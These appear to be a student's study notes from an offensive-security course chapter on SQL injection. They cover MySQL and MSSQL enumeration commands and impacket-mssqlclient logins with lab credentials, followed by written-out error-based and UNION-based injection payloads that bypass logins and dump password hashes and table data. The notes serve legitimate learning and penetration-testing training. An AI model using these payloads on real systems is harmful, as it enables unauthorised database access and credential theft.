# 10. SQL Injection Attacks
SQL vulnerabilities typically allow the attacker to extend the original application query to include database tables that would normally be inaccessible

## 10.1. SQL Theory and Databases
no notes

### 10.1.1. SQL Theory Refresher
User interact with front end - HTML, CSS, and JavaScript.

Front end sends data to backend - PHP, Java, and Python.

Back end interact with data residing in a database - MySQL, Microsoft SQL Server, PostgreSQL, and Oracle 

The $_Post variable lets you extract data from a post request.
$uname = $_POST['uname'];
$passwd =$_POST['password'];

It appears to be stored in a map where the variable uname stores the username key

### 10.1.2. DB Types and Characteristics (focus on mysql and mssql)
MariaDB is a fork of Mysql, and is open-source

default mysql port is 3306

mysql -u root -p'root' -h 192.168.50.16 -P 3306
select version();
select system_user(); -- note root in db is only for db not for entire system
show databases;

example of how a query to get a password might look -- in this example the password is stored as a Caching-Sha-256 hash
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';

Once you get the hash you may be able to crack it

MSQL part

Windows has SQL command that lets queries be run via CMD prompt or remotely from another machine

Impacket has a tool for interacting with a protocol adapted by MSSQL called Tabular Data Stream (this is the name of the protocol not the tool)

The tools name is called impacket-mssqlclient tool

impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
-windows-auth: forces Windows authentication instead of Kerberos
Administrator: the username
Lab123: The password
192...18: the host

SELECT @@version;
NOTE: using sqlcmd "SELECT @@version;" must be followed by GO on a seperate line. However TDS protocol does not require this. Since Impacket uses TDS, the command above does not have this!

SELECT name FROM sys.databases;

Since master, tempdb, model, and msdb are default databases, we want to explore the custom offsec database because it might contain data belonging to our target

SELECT * FROM offsec.information_schema.tables;

somethings that I think are worth noting:
mysql user name was queried from mysql.users which seems like a default... for mssql, we intentionally skip the default databases.
in mysql it seems like there is one information_schema which is its own database. in mssql, it seems like each database has their own information schema within.
I am not sure if this is a common occurance or just this particular example. Something to keep in the back of the mind.
There seems to be an inconsistancy on which route they pursue and I can't tell if its to give a more holistic view, or specifically for the different database types.

update: A few google searches show that mysql.users is shown to be where users grant permissions are stored

https://learnsql.com/blog/sql-server-cheat-sheet/ -- resource for navigating mssql.
https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server is pretty good as well

select * from sys.databases;
use <database>
select * from sys.tables --while in current database

get all users
SELECT * FROM sysusers
or
select * from sys.database_principals;

### 10.2.1. Identifying SQLi via Error-based Payloads
$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";

offsec' OR 1=1 -- //

SQL injection inband = vulnerable application provides result of query with the application returned value
Most production web apps do not show error messages as showing these messages is considered a security flaw

' or 1=1 in (select @@version) -- //

MySQL accepts both version() and @@version statements.

dump information from users table
' OR 1=1 in (SELECT * FROM users) -- //

There was an error from trying to select too many columns. This is because we used * in the query which grabs every column.

select only password from users

' or 1=1 in (SELECT password FROM users) -- //
This returned Truncated incorrect double values... those were the hashes

You can use "where" to narrow which account has which hash while still abiding the 1 column limitation in this example
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //

### 10.2.2 UNION-based Payloads

Whenever we're dealing with in-band SQL injections and the result of the query is displayed along with the application-returned value, we should also test for UNION-based SQL injections.

2 conditions needed for union sqli attacks
The injected UNION query has to include the same number of columns as the original query.
The data types need to be compatible between each column.

$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";

name LIKE '".$_POST["search_input"]."%'"; -- this returns any value that has input from post request and a wildcard of characters (specified by the %)

Figure out how many columns are needed. increment 1 until you hit an error
' ORDER BY 1-- //

replace un-needed extra columns with null
%' UNION SELECT database(), user(), @@version, null, null -- //

Since we want to retrieve all the data from the customers table, we'll use the percentage sign followed by a single quote to close the search parameter. 

The query statement has a certain layout of data types... etc column 1 is integer, 2 is string, etc. We can try shifting
the nulls and sqli data to get what we need like so

' UNION SELECT null, null, database(), user(), @@version  -- //
notice the placement of nulls, and database here versus the statement above

This web application explicitly omits the output from the first column because IDs are not usually useful information for end users.


' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
see other tables in current database

' UNION SELECT null, username, password, description, null FROM users -- //
attempt to dump passwords
extra reading




<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><  

<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><  

<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><  

<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><  

Extra Reading  

<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><  
10.2.2 UNION-based Payloads
https://www.w3schools.com/sql/sql_union.asp 
https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html
https://en.wikipedia.org/wiki/MD5

10.1.2. DB Types and Characteristics
https://www.mysql.com/
  mysql main website

https://mariadb.org/
  open source fork of mysql

https://dev.mysql.com/doc/refman/8.0/en/caching-sha2-pluggable-authentication.html
  Mysql hash are implemented via plugins

http://www.microsoft.com/sqlserver
  page did not load

https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility
  lets you run Transact-SQL statements via
  Command prompt, Windows Scripts
https://github.com/SecureAuthCorp/impacket

https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/893fcc7e-8a39-4b3c-815a-773b7b982c50/
  TDS is used for transfer of requests from Clients and Databases

 

10. SQL Injection Attacks
https://owasp.org/www-project-top-ten/
https://owasp.org/Top10/A03_2021-Injection/

 
